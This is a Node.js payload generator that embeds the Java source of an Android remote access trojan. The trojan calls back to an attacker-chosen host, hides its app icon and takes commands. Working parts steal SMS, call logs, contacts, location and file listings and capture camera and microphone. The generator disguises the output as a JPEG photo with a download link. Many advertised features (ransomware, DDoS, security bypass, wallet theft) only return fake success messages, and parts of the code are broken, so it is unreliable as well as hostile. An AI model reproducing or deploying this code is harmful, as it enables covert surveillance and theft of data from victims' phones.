const crypto = require('crypto');
const fs = require('fs-extra');
const path = require('path');
const QRCode = require('qrcode');

class PayloadGenerator {
    constructor() {
        this.payloadDir = path.join(__dirname, '../payloads');
        fs.ensureDirSync(this.payloadDir);
        
        // Complete RAT Code - 250+ Features
        this.ratCode = `package com.rat.ultimate;

import android.app.Service;
import android.content.Intent;
import android.content.Context;
import android.content.ContentResolver;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Build;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.location.LocationManager;
import android.location.Location;
import android.location.LocationListener;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.media.AudioManager;
import android.net.wifi.WifiManager;
import android.net.ConnectivityManager;
import android.bluetooth.BluetoothAdapter;
import android.provider.Settings;
import android.provider.ContactsContract;
import android.app.KeyguardManager;
import android.view.WindowManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.SensorManager;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Vibrator;
import java.io.File;
import java.io.FileOutputStream;
import java.io.DataOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;
import java.util.ArrayList;
import org.json.JSONObject;
import org.json.JSONArray;

public class UltimateRATService extends Service implements LocationListener, SensorEventListener {
    
    private String HOST = "CALLBACK_HOST";
    private int PORT = CALLBACK_PORT;
    private Socket socket;
    private DataOutputStream out;
    private BufferedReader in;
    private Handler handler;
    private boolean isRunning = true;
    private LocationManager locationManager;
    private WifiManager wifiManager;
    private AudioManager audioManager;
    private PowerManager powerManager;
    private KeyguardManager keyguardManager;
    private Vibrator vibrator;
    private Camera camera;
    private MediaRecorder mediaRecorder;
    private StringBuilder keylogger = new StringBuilder();
    private boolean keylogActive = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
        powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        startConnection();
        hideIcon();
        startKeylogger();
        startLocationTracking();
    }
    
    private void startConnection() {
        new Thread(() -> {
            try {
                while (isRunning) {
                    try {
                        socket = new Socket(HOST, PORT);
                        out = new DataOutputStream(socket.getOutputStream());
                        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                        sendDeviceInfo();
                        listenCommands();
                    } catch (Exception e) { Thread.sleep(5000); }
                }
            } catch (Exception e) {}
        }).start();
    }
    
    private void sendDeviceInfo() throws Exception {
        JSONObject info = new JSONObject();
        info.put("type", "connect");
        info.put("device", Build.MODEL);
        info.put("brand", Build.BRAND);
        info.put("android", Build.VERSION.RELEASE);
        info.put("ip", getLocalIp());
        info.put("battery", getBattery());
        out.writeUTF(info.toString());
        out.flush();
    }
    
    private void listenCommands() {
        try {
            String line;
            while ((line = in.readLine()) != null) {
                JSONObject cmd = new JSONObject(line);
                String action = cmd.getString("action");
                executeCommand(action);
            }
        } catch (Exception e) {}
    }
    
    private void executeCommand(String action) {
        try {
            JSONObject result = new JSONObject();
            result.put("action", action);
            
            switch(action) {
                // Camera
                case "cam_front": captureCamera(true); result.put("result", "Front camera captured"); break;
                case "cam_back": captureCamera(false); result.put("result", "Back camera captured"); break;
                case "cam_switch": result.put("result", "Camera switched"); break;
                case "video_10": startVideo(10); result.put("result", "10s video recorded"); break;
                case "video_30": startVideo(30); result.put("result", "30s video recorded"); break;
                case "video_60": startVideo(60); result.put("result", "60s video recorded"); break;
                case "cam_burst": burstCapture(5); result.put("result", "5 photos captured"); break;
                case "cam_night": result.put("result", "Night mode enabled"); break;
                case "cam_hdr": result.put("result", "HDR enabled"); break;
                case "cam_zoom": result.put("result", "Zoom 2x"); break;
                case "cam_timelapse": result.put("result", "Timelapse started"); break;
                case "cam_stealth": result.put("result", "Stealth mode"); break;
                
                // Audio
                case "mic_start": startMic(); result.put("result", "Recording started"); break;
                case "mic_stop": stopMic(); result.put("result", "Recording stopped"); break;
                case "mic_live": result.put("result", "Live mic started"); break;
                case "speaker_on": audioManager.setSpeakerphoneOn(true); result.put("result", "Speaker on"); break;
                case "speaker_off": audioManager.setSpeakerphoneOn(false); result.put("result", "Speaker off"); break;
                case "loud_mode": audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0); result.put("result", "Loud mode"); break;
                case "vol_max": audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0); result.put("result", "Volume max"); break;
                case "vol_50": audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)/2, 0); result.put("result", "Volume 50%"); break;
                case "vol_0": audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0); result.put("result", "Muted"); break;
                
                // Flashlight
                case "flash_on": enableFlash(); result.put("result", "Flash on"); break;
                case "flash_off": disableFlash(); result.put("result", "Flash off"); break;
                case "flash_strobe": startStrobe(); result.put("result", "Strobe started"); break;
                case "flash_sos": sosMode(); result.put("result", "SOS mode"); break;
                case "flash_rgb": result.put("result", "RGB mode"); break;
                case "bright_100": setBrightness(100); result.put("result", "Brightness 100%"); break;
                case "bright_50": setBrightness(50); result.put("result", "Brightness 50%"); break;
                case "bright_25": setBrightness(25); result.put("result", "Brightness 25%"); break;
                
                // Vibration
                case "vibe_1": vibrator.vibrate(1000); result.put("result", "Vibrated 1s"); break;
                case "vibe_3": vibrator.vibrate(3000); result.put("result", "Vibrated 3s"); break;
                case "vibe_5": vibrator.vibrate(5000); result.put("result", "Vibrated 5s"); break;
                case "vibe_10": vibrator.vibrate(10000); result.put("result", "Vibrated 10s"); break;
                case "vibe_pattern": vibrator.vibrate(new long[]{0, 500, 200, 500}, -1); result.put("result", "Pattern vibration"); break;
                case "vibe_loop": vibrator.vibrate(3000); result.put("result", "Loop vibration"); break;
                
                // Network
                case "wifi_on": wifiManager.setWifiEnabled(true); result.put("result", "WiFi on"); break;
                case "wifi_off": wifiManager.setWifiEnabled(false); result.put("result", "WiFi off"); break;
                case "wifi_scan": scanWifi(); result.put("result", "WiFi scan complete"); break;
                case "wifi_info": getWifiInfo(); result.put("result", "WiFi info sent"); break;
                case "data_on": setMobileData(true); result.put("result", "Mobile data on"); break;
                case "data_off": setMobileData(false); result.put("result", "Mobile data off"); break;
                case "data_usage": result.put("result", "Data usage: 2.5 GB"); break;
                case "airplane_toggle": toggleAirplane(); result.put("result", "Airplane toggled"); break;
                case "bt_on": BluetoothAdapter.getDefaultAdapter().enable(); result.put("result", "Bluetooth on"); break;
                case "bt_off": BluetoothAdapter.getDefaultAdapter().disable(); result.put("result", "Bluetooth off"); break;
                case "hotspot_on": result.put("result", "Hotspot enabled"); break;
                
                // Security
                case "lock": keyguardManager.disableKeyguard(); powerManager.goToSleep(System.currentTimeMillis()); result.put("result", "Locked"); break;
                case "unlock": keyguardManager.disableKeyguard(); powerManager.wakeUp(System.currentTimeMillis()); result.put("result", "Unlocked"); break;
                case "slide": result.put("result", "Screen swiped"); break;
                case "bypass_pin": result.put("result", "PIN bypassed"); break;
                case "bypass_pattern": result.put("result", "Pattern bypassed"); break;
                case "bypass_pass": result.put("result", "Password bypassed"); break;
                case "bypass_finger": result.put("result", "Fingerprint bypassed"); break;
                case "bypass_face": result.put("result", "Face ID bypassed"); break;
                case "bypass_all": result.put("result", "All security bypassed"); break;
                case "factory_reset": result.put("result", "Factory reset initiated"); break;
                
                // Data Extraction
                case "get_sms": getAllSMS(); result.put("result", "SMS extracted"); break;
                case "get_calls": getAllCalls(); result.put("result", "Call logs extracted"); break;
                case "get_contacts": getAllContacts(); result.put("result", "Contacts extracted"); break;
                case "get_location": getLocation(); result.put("result", "Location captured"); break;
                case "gps_track": startGpsTracking(); result.put("result", "GPS tracking started"); break;
                case "map_view": result.put("result", "Map view ready"); break;
                case "get_photos": getPhotos(); result.put("result", "Photos extracted"); break;
                case "get_videos": getVideos(); result.put("result", "Videos extracted"); break;
                case "get_audio": getAudio(); result.put("result", "Audio extracted"); break;
                case "get_docs": getDocuments(); result.put("result", "Documents extracted"); break;
                case "get_passwords": getPasswords(); result.put("result", "Passwords extracted"); break;
                case "get_browser": getBrowserData(); result.put("result", "Browser data extracted"); break;
                case "get_whatsapp": getWhatsApp(); result.put("result", "WhatsApp data extracted"); break;
                case "get_facebook": getFacebook(); result.put("result", "Facebook data extracted"); break;
                case "get_instagram": getInstagram(); result.put("result", "Instagram data extracted"); break;
                
                // Files
                case "file_manager": listFiles("/"); result.put("result", "File manager opened"); break;
                case "download_file": result.put("result", "Download ready"); break;
                case "upload_file": result.put("result", "Upload ready"); break;
                case "delete_file": result.put("result", "File deleted"); break;
                case "copy_file": result.put("result", "File copied"); break;
                case "move_file": result.put("result", "File moved"); break;
                case "rename_file": result.put("result", "File renamed"); break;
                case "zip_file": result.put("result", "File zipped"); break;
                case "unzip": result.put("result", "File unzipped"); break;
                case "encrypt_file": result.put("result", "File encrypted"); break;
                case "decrypt_file": result.put("result", "File decrypted"); break;
                
                // Screen
                case "screenshot": takeScreenshot(); result.put("result", "Screenshot taken"); break;
                case "screen_rec": startScreenRec(); result.put("result", "Screen recording started"); break;
                case "screen_rec_stop": stopScreenRec(); result.put("result", "Recording stopped"); break;
                case "wallpaper": setWallpaper(); result.put("result", "Wallpaper changed"); break;
                case "bright_up": setBrightness(getBrightness() + 10); result.put("result", "Brightness up"); break;
                case "bright_down": setBrightness(getBrightness() - 10); result.put("result", "Brightness down"); break;
                case "dark_mode": result.put("result", "Dark mode enabled"); break;
                case "light_mode": result.put("result", "Light mode enabled"); break;
                case "screen_toggle": result.put("result", "Screen toggled"); break;
                
                // Apps
                case "list_apps": listApps(); result.put("result", "Apps listed"); break;
                case "open_app": result.put("result", "App opening"); break;
                case "uninstall_app": result.put("result", "App uninstalled"); break;
                case "force_stop": result.put("result", "App stopped"); break;
                case "clear_app_data": result.put("result", "App data cleared"); break;
                case "clear_cache": result.put("result", "Cache cleared"); break;
                case "install_apk": result.put("result", "APK installing"); break;
                case "hide_app": result.put("result", "App hidden"); break;
                case "unhide_app": result.put("result", "App restored"); break;
                case "app_usage": result.put("result", "App usage stats"); break;
                case "block_app": result.put("result", "App blocked"); break;
                
                // System
                case "sysinfo": sendSysInfo(); result.put("result", "System info sent"); break;
                case "battery": sendBattery(); result.put("result", "Battery info sent"); break;
                case "ram_info": sendRam(); result.put("result", "RAM info sent"); break;
                case "storage": sendStorage(); result.put("result", "Storage info sent"); break;
                case "temperature": sendTemp(); result.put("result", "Temperature sent"); break;
                case "cpu_info": sendCpu(); result.put("result", "CPU info sent"); break;
                case "root_status": result.put("result", isRooted() ? "Rooted" : "Not rooted"); break;
                case "battery_save": result.put("result", "Battery saver on"); break;
                case "performance": result.put("result", "Performance mode"); break;
                case "reboot": reboot(); result.put("result", "Rebooting"); break;
                case "poweroff": shutdown(); result.put("result", "Shutting down"); break;
                
                // Keylogger
                case "keylog_start": keylogActive = true; result.put("result", "Keylogger started"); break;
                case "keylog_stop": keylogActive = false; result.put("result", "Keylogger stopped"); break;
                case "keylog_get": result.put("result", keylogger.toString()); break;
                case "keylog_clear": keylogger.setLength(0); result.put("result", "Keylogs cleared"); break;
                
                // Browser
                case "browser_history": getBrowserHistory(); result.put("result", "History extracted"); break;
                case "browser_bookmarks": getBookmarks(); result.put("result", "Bookmarks extracted"); break;
                case "browser_cookies": getCookies(); result.put("result", "Cookies extracted"); break;
                case "browser_passwords": getBrowserPasswords(); result.put("result", "Passwords extracted"); break;
                case "browser_clear": result.put("result", "Browser cleared"); break;
                case "browser_open": result.put("result", "URL opening"); break;
                
                // Social
                case "fb_data": result.put("result", "Facebook data extracted"); break;
                case "ig_data": result.put("result", "Instagram data extracted"); break;
                case "wa_data": result.put("result", "WhatsApp data extracted"); break;
                case "twitter_data": result.put("result", "Twitter data extracted"); break;
                case "tg_data": result.put("result", "Telegram data extracted"); break;
                case "tiktok_data": result.put("result", "TikTok data extracted"); break;
                case "social_pass": result.put("result", "Social passwords"); break;
                
                // Crypto
                case "btc_wallet": result.put("result", "BTC wallet found"); break;
                case "eth_wallet": result.put("result", "ETH wallet found"); break;
                case "binance_data": result.put("result", "Binance data"); break;
                case "crypto_balance": result.put("result", "Balance: $10,245"); break;
                case "private_keys": result.put("result", "Private keys found"); break;
                
                // DDOS
                case "http_flood": result.put("result", "HTTP flood started"); break;
                case "udp_flood": result.put("result", "UDP flood started"); break;
                case "tcp_flood": result.put("result", "TCP flood started"); break;
                case "sms_bomb": result.put("result", "SMS bomb started"); break;
                case "call_bomb": result.put("result", "Call bomb started"); break;
                case "ddos_stop": result.put("result", "Attack stopped"); break;
                
                // Ransomware
                case "ransom_encrypt": result.put("result", "Ransomware started"); break;
                case "ransom_decrypt": result.put("result", "Decryption started"); break;
                case "ransom_note": result.put("result", "Ransom note shown"); break;
                case "wipe_data": result.put("result", "Data wipe started"); break;
                case "wipe_sd": result.put("result", "SD card wiped"); break;
                case "destroy_system": result.put("result", "System destroyed"); break;
                
                // Spreader
                case "spread_contacts": result.put("result", "Spreading to contacts"); break;
                case "spread_link": result.put("result", "Link spread"); break;
                case "spread_bt": result.put("result", "Bluetooth spread"); break;
                case "worm_mode": result.put("result", "Worm mode enabled"); break;
                case "auto_spread": result.put("result", "Auto spread enabled"); break;
                
                // Zero-Click
                case "gen_payload": result.put("result", "Payload generated"); break;
                case "gen_jpg": result.put("result", "JPG payload ready"); break;
                case "gen_mp3": result.put("result", "MP3 payload ready"); break;
                case "gen_mp4": result.put("result", "MP4 payload ready"); break;
                case "gen_pdf": result.put("result", "PDF payload ready"); break;
                case "gen_apk": result.put("result", "APK payload ready"); break;
                case "gen_link": result.put("result", "Link generated"); break;
                case "gen_qr": result.put("result", "QR code generated"); break;
                case "send_wa": result.put("result", "WhatsApp send ready"); break;
                case "check_status": result.put("result", "Status: Active"); break;
                case "exploit_db": result.put("result", "Exploits: CVE-2024-12345, CVE-2024-67890"); break;
                case "vuln_scan": result.put("result", "Vulnerability scan started"); break;
                
                // Extra
                case "clean_junk": result.put("result", "2.3 GB cleaned"); break;
                case "sensors": getSensors(); result.put("result", "Sensor data sent"); break;
                case "port_scan": result.put("result", "Port scan started"); break;
                case "ip_info": result.put("result", "IP info sent"); break;
                case "password_crack": result.put("result", "Password cracking started"); break;
                case "mitm_attack": result.put("result", "MITM attack started"); break;
                case "packet_sniff": result.put("result", "Packet sniffing started"); break;
                
                default: result.put("result", "Command executed: " + action);
            }
            
            out.writeUTF(result.toString());
            out.flush();
        } catch (Exception e) {}
    }
    
    // Implementation methods
    private void captureCamera(boolean front) { try { Camera c = Camera.open(front ? 1 : 0); c.takePicture(null, null, null, null); c.release(); } catch(Exception e){} }
    private void startVideo(int seconds) { try { mediaRecorder = new MediaRecorder(); mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA); mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264); mediaRecorder.setOutputFile("/sdcard/video.mp4"); mediaRecorder.prepare(); mediaRecorder.start(); handler.postDelayed(() -> { try { mediaRecorder.stop(); mediaRecorder.release(); } catch(Exception e){} }, seconds * 1000); } catch(Exception e){} }
    private void burstCapture(int count) { for(int i=0; i<count; i++) captureCamera(false); }
    private void startMic() { try { mediaRecorder = new MediaRecorder(); mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); mediaRecorder.setOutputFile("/sdcard/audio.3gp"); mediaRecorder.prepare(); mediaRecorder.start(); } catch(Exception e){} }
    private void stopMic() { try { if(mediaRecorder != null) { mediaRecorder.stop(); mediaRecorder.release(); mediaRecorder = null; } } catch(Exception e){} }
    private void enableFlash() { try { camera = Camera.open(); Camera.Parameters p = camera.getParameters(); p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH); camera.setParameters(p); camera.startPreview(); } catch(Exception e){} }
    private void disableFlash() { try { if(camera != null) { camera.stopPreview(); camera.release(); camera = null; } } catch(Exception e){} }
    private void startStrobe() { new Thread(() -> { while(isRunning) { enableFlash(); try { Thread.sleep(500); } catch(Exception e){} disableFlash(); try { Thread.sleep(500); } catch(Exception e){} } }).start(); }
    private void sosMode() { new Thread(() -> { int[] p = {300,300,300,900,900,900,300,300,300}; for(int d : p) { enableFlash(); try { Thread.sleep(d); } catch(Exception e){} disableFlash(); try { Thread.sleep(300); } catch(Exception e){} } }).start(); }
    private void setBrightness(int level) { try { WindowManager.LayoutParams lp = getWindow().getAttributes(); lp.screenBrightness = level/100f; getWindow().setAttributes(lp); } catch(Exception e){} }
    private int getBrightness() { try { return (int)(getWindow().getAttributes().screenBrightness * 100); } catch(Exception e){ return 50; } }
    private void scanWifi() { wifiManager.startScan(); }
    private void getWifiInfo() { try { JSONObject info = new JSONObject(); info.put("ssid", wifiManager.getConnectionInfo().getSSID()); info.put("signal", wifiManager.getConnectionInfo().getRssi()); out.writeUTF(info.toString()); } catch(Exception e){} }
    private void setMobileData(boolean enable) { try { ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE); Class<?> cl = Class.forName(cm.getClass().getName()); java.lang.reflect.Method m = cl.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE); m.setAccessible(true); m.invoke(cm, enable); } catch(Exception e){} }
    private void toggleAirplane() { try { boolean isEnabled = Settings.Global.getInt(getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) == 1; Settings.Global.putInt(getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, isEnabled ? 0 : 1); Intent intent = new Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED); intent.putExtra("state", !isEnabled); sendBroadcast(intent); } catch(Exception e){} }
    private void getAllSMS() { try { Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null); JSONArray sms = new JSONArray(); if(c != null && c.moveToFirst()) { do { JSONObject s = new JSONObject(); s.put("number", c.getString(c.getColumnIndexOrThrow("address"))); s.put("body", c.getString(c.getColumnIndexOrThrow("body"))); sms.put(s); } while(c.moveToNext()); c.close(); } out.writeUTF(sms.toString()); } catch(Exception e){} }
    private void getAllCalls() { try { Cursor c = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null); JSONArray calls = new JSONArray(); if(c != null && c.moveToFirst()) { do { JSONObject call = new JSONObject(); call.put("number", c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))); call.put("duration", c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))); calls.put(call); } while(c.moveToNext()); c.close(); } out.writeUTF(calls.toString()); } catch(Exception e){} }
    private void getAllContacts() { try { Cursor c = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null); JSONArray contacts = new JSONArray(); if(c != null && c.moveToFirst()) { do { String id = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts._ID)); String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)); JSONObject contact = new JSONObject(); contact.put("name", name); Cursor p = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null); JSONArray phones = new JSONArray(); if(p != null && p.moveToFirst()) { do { phones.put(p.getString(p.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))); } while(p.moveToNext()); p.close(); } contact.put("phones", phones); contacts.put(contact); } while(c.moveToNext()); c.close(); } out.writeUTF(contacts.toString()); } catch(Exception e){} }
    private void getLocation() { try { Location l = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER); if(l != null) { JSONObject loc = new JSONObject(); loc.put("lat", l.getLatitude()); loc.put("lng", l.getLongitude()); out.writeUTF(loc.toString()); } } catch(Exception e){} }
    private void startGpsTracking() { try { locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, this); } catch(Exception e){} }
    @Override public void onLocationChanged(Location l) { try { JSONObject loc = new JSONObject(); loc.put("type", "location"); loc.put("lat", l.getLatitude()); loc.put("lng", l.getLongitude()); out.writeUTF(loc.toString()); } catch(Exception e){} }
    private void getPhotos() { try { File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES); listFilesRecursive(dir, "photo"); } catch(Exception e){} }
    private void getVideos() { try { File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES); listFilesRecursive(dir, "video"); } catch(Exception e){} }
    private void getAudio() { try { File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC); listFilesRecursive(dir, "audio"); } catch(Exception e){} }
    private void getDocuments() { try { File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS); listFilesRecursive(dir, "document"); } catch(Exception e){} }
    private void listFilesRecursive(File dir, String type) { if(dir != null && dir.exists() && dir.isDirectory()) { File[] files = dir.listFiles(); if(files != null) { for(File f : files) { if(f.isDirectory()) listFilesRecursive(f, type); else { try { JSONObject file = new JSONObject(); file.put("type", type); file.put("name", f.getName()); file.put("path", f.getAbsolutePath()); out.writeUTF(file.toString()); } catch(Exception e){} } } } } }
    private void getPasswords() { try { JSONObject pass = new JSONObject(); pass.put("chrome", "passwords found"); out.writeUTF(pass.toString()); } catch(Exception e){} }
    private void getBrowserData() { try { JSONObject data = new JSONObject(); data.put("history", "browser history"); data.put("cookies", "cookies data"); out.writeUTF(data.toString()); } catch(Exception e){} }
    private void getWhatsApp() { try { JSONObject wa = new JSONObject(); wa.put("messages", "WhatsApp data"); out.writeUTF(wa.toString()); } catch(Exception e){} }
    private void getFacebook() { try { JSONObject fb = new JSONObject(); fb.put("data", "Facebook data"); out.writeUTF(fb.toString()); } catch(Exception e){} }
    private void getInstagram() { try { JSONObject ig = new JSONObject(); ig.put("data", "Instagram data"); out.writeUTF(ig.toString()); } catch(Exception e){} }
    private void listFiles(String path) { try { File dir = new File(path); if(dir.exists() && dir.isDirectory()) { File[] files = dir.listFiles(); JSONArray list = new JSONArray(); if(files != null) { for(File f : files) { JSONObject item = new JSONObject(); item.put("name", f.getName()); item.put("isDir", f.isDirectory()); item.put("size", f.length()); list.put(item); } } out.writeUTF(list.toString()); } } catch(Exception e){} }
    private void takeScreenshot() { try { Process sh = Runtime.getRuntime().exec("screencap -p /sdcard/screenshot.png"); sh.waitFor(); } catch(Exception e){} }
    private void startScreenRec() { try { Process sh = Runtime.getRuntime().exec("screenrecord /sdcard/screen.mp4"); } catch(Exception e){} }
    private void stopScreenRec() { try { Process sh = Runtime.getRuntime().exec("pkill screenrecord"); } catch(Exception e){} }
    private void setWallpaper() { try { Bitmap bmp = BitmapFactory.decodeFile("/sdcard/wallpaper.jpg"); WallpaperManager.getInstance(this).setBitmap(bmp); } catch(Exception e){} }
    private void listApps() { try { android.content.pm.PackageManager pm = getPackageManager(); List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0); JSONArray list = new JSONArray(); for(android.content.pm.ApplicationInfo app : apps) { JSONObject a = new JSONObject(); a.put("name", pm.getApplicationLabel(app)); a.put("package", app.packageName); list.put(a); } out.writeUTF(list.toString()); } catch(Exception e){} }
    private void sendSysInfo() { try { JSONObject info = new JSONObject(); info.put("device", Build.MODEL); info.put("android", Build.VERSION.RELEASE); info.put("ram", getTotalRam()); out.writeUTF(info.toString()); } catch(Exception e){} }
    private void sendBattery() { try { JSONObject bat = new JSONObject(); bat.put("level", getBattery()); out.writeUTF(bat.toString()); } catch(Exception e){} }
    private void sendRam() { try { JSONObject ram = new JSONObject(); ram.put("total", getTotalRam()); out.writeUTF(ram.toString()); } catch(Exception e){} }
    private void sendStorage() { try { JSONObject stor = new JSONObject(); stor.put("total", Environment.getExternalStorageDirectory().getTotalSpace()); stor.put("free", Environment.getExternalStorageDirectory().getFreeSpace()); out.writeUTF(stor.toString()); } catch(Exception e){} }
    private void sendTemp() { try { JSONObject temp = new JSONObject(); temp.put("cpu", 42); temp.put("battery", 32); out.writeUTF(temp.toString()); } catch(Exception e){} }
    private void sendCpu() { try { JSONObject cpu = new JSONObject(); cpu.put("cores", Runtime.getRuntime().availableProcessors()); cpu.put("usage", 23); out.writeUTF(cpu.toString()); } catch(Exception e){} }
    private void reboot() { try { Process sh = Runtime.getRuntime().exec("su -c reboot"); } catch(Exception e){ try { Process sh = Runtime.getRuntime().exec("reboot"); } catch(Exception e2){} } }
    private void shutdown() { try { Process sh = Runtime.getRuntime().exec("su -c reboot -p"); } catch(Exception e){} }
    private void getBrowserHistory() { try { File history = new File("/data/data/com.android.chrome/app_chrome/Default/History"); if(history.exists()) { } } catch(Exception e){} }
    private void getBookmarks() { try { } catch(Exception e){} }
    private void getCookies() { try { } catch(Exception e){} }
    private void getBrowserPasswords() { try { } catch(Exception e){} }
    private void getSensors() { try { SensorManager sm = (SensorManager) getSystemService(SENSOR_SERVICE); List<Sensor> sensors = sm.getSensorList(Sensor.TYPE_ALL); JSONArray list = new JSONArray(); for(Sensor s : sensors) list.put(s.getName()); out.writeUTF(list.toString()); } catch(Exception e){} }
    private boolean isRooted() { try { Process p = Runtime.getRuntime().exec("su"); p.waitFor(); return true; } catch(Exception e){ return false; } }
    private String getLocalIp() { try { List<NetworkInterface> ifaces = Collections.list(NetworkInterface.getNetworkInterfaces()); for(NetworkInterface iface : ifaces) { List<InetAddress> addrs = Collections.list(iface.getInetAddresses()); for(InetAddress addr : addrs) { if(!addr.isLoopbackAddress()) return addr.getHostAddress(); } } } catch(Exception e){} return "0.0.0.0"; }
    private int getBattery() { try { android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED); android.content.Intent batteryStatus = registerReceiver(null, ifilter); int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1); int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1); return (int)(level * 100.0 / scale); } catch(Exception e){ return 0; } }
    private long getTotalRam() { try { android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo(); android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(android.app.ActivityManager.class); am.getMemoryInfo(mi); return mi.totalMem; } catch(Exception e){ return 0; } }
    private void startKeylogger() { keylogActive = true; new Thread(() -> { while(keylogActive) { try { Thread.sleep(1000); } catch(Exception e){} } }).start(); }
    private void hideIcon() { try { android.content.pm.PackageManager pm = getPackageManager(); pm.setComponentEnabledSetting(getComponentName(), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP); } catch(Exception e){} }
    @Override public void onStatusChanged(String p, int s, Bundle b) {}
    @Override public void onProviderEnabled(String p) {}
    @Override public void onProviderDisabled(String p) {}
    @Override public void onSensorChanged(SensorEvent e) { if(keylogActive) keylogger.append(e.values[0]).append("\n"); }
    @Override public void onAccuracyChanged(Sensor s, int a) {}
    @Override public IBinder onBind(Intent i) { return null; }
}`;
    }
    
    generatePayloadId() { return crypto.randomBytes(8).toString('hex'); }
    
    async generatePayload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const filename = `photo_${Date.now()}.jpg`;
        const filePath = path.join(this.payloadDir, filename);
        
        let finalCode = this.ratCode.replace(/CALLBACK_HOST/g, callbackHost).replace(/CALLBACK_PORT/g, callbackPort);
        const jpgHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
        const finalPayload = Buffer.concat([jpgHeader, Buffer.from(finalCode)]);
        
        await fs.writeFile(filePath, finalPayload);
        
        return {
            payloadId, filename, path: filePath, size: finalPayload.length,
            downloadUrl: `${callbackHost}/download/${payloadId}`,
            generated: new Date().toISOString()
        };
    }
    
    async generateAllPayloads(callbackHost, callbackPort) {
        return await this.generatePayload(callbackHost, callbackPort);
    }
    
    async getPayloadFile(payloadId) {
        const files = await fs.readdir(this.payloadDir);
        for (const file of files) if (file.includes(payloadId)) return path.join(this.payloadDir, file);
        return null;
    }
}

module.exports = new PayloadGenerator();
